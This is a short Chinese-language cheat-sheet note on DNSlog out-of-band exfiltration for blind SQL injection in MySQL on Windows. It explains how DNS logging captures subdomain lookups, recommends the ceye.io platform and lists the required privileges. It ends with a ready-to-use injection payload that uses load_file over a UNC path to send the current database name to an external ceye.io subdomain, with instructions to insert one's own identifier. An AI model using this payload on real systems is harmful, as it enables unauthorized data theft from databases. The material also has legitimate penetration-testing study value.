### 原理

譬如我有一域名 `abc.com`，其对应的 IP 为 `123.123.123.123`  
DNSlog 就会记录用户请求 abc.com 的过程，解析值为 IP 地址  
除了顶级域名，像这样的次级域名：`xx.abc.com` 依然可被 DNSlog 记录！

<br>

**推荐 DNSlog 平台**

http://ceye.io

<br>

**可实现 DNSlog 的条件**

1. 具有操控数据库的 root 权限（针对 mysql）
2. 数据库可读写权限，即 secure_file_priv 值为空
3. 仅支持 windows

<br>

**为什么要用它？**

有些情况下，SQL 盲注无回显，故需要 DNSlog 来展示回显信息给我们

<br>

### 常用代码

回显注入（仅需修改六个 x 的地方为你的 identifier 即可）  
`?id=1 and if((select load_file(concat('\\\\',(select database()),'.xxxxxx.ceye.io\\abc'))),1,0) -- -`

<br>
